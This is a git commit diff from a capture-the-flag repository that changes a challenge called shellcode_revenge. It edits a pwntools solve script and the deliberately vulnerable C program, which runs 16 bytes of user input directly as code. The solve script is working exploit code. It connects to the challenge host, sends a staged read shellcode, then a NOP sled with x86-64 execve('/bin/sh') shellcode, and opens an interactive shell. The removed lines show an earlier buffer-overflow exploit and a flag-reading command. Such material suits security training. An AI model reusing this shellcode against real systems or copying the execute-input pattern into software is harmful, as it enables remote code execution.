b7cc98cefc130253c76baf53b308caf5074eb7d5
yuan <ssspeed00@gmail.com>
2017-10-04 18:05:17 +0800

    CTF

--- shellcode_revenge/flag.py
+++ shellcode_revenge/flag.py
@@ -3,16 +3,14 @@ from pwn import *
 
 # AD{NX_pr0t4ct10n_d1sab1e_1s_h4cker_fr1endly}
 
-host , port = 'ctf.yuawn.idv.tw' , 10103
+host , port = 'ctf.yuawn.idv.tw' , 10104
 y = remote( host , port )
 
-y.recvuntil('0x')
-ad = int( y.recvline().strip() , 16 )
+sc = '1\xff\xbe`\x10`\x00\xba\x00\x01\x00\x001\xc0\x0f\x05'
 
-sc = 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05'
+y.send( sc )
 
-y.sendline( sc + 'D' * ( 0x78 - len( sc ) ) + p64( ad ) )
-
-y.sendline( 'cat /home/`whoami`/flag' )
+y.send( '\x90' * 0x20 + 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05' )
+#y.sendline( 'cat /home/`whoami`/flag' )
 
 y.interactive()
--- shellcode_revenge/home/shellcode_revenge.c
+++ shellcode_revenge/home/shellcode_revenge.c
@@ -1,14 +1,14 @@
 #include<stdio.h>
 
-char name[20];
+char name[16];
 
 int main(){
     setvbuf(stdout,0,2,0);
-    puts( "Give me your shellcode , I will run it directly , but only 20 bytes :(\n");
+    puts( "Give me your shellcode , I will run it directly , but only 16 bytes :(");
 
     int (*yuawn)() = (int(*)())name;
 
-    read( 0 , name , 20 );
+    read( 0 , name , 16 );
 
     yuawn();
 
